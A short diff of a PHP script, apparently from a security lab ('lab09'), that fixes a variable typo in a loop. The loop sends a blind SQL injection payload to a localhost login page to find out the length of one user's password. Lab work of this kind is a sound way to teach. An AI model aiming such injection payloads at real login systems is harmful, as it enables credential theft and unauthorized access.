@@ -26,7 +26,7 @@ for ($i = 1; $i <= 5; $i++) {
 
 
 $sizepwd = 0;
-while ($sizpwd < 25)
+while ($sizepwd < 25)
 {
     $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(password)%20=%20$sizepwd--%20";
 	$result = file_get_contents($url);
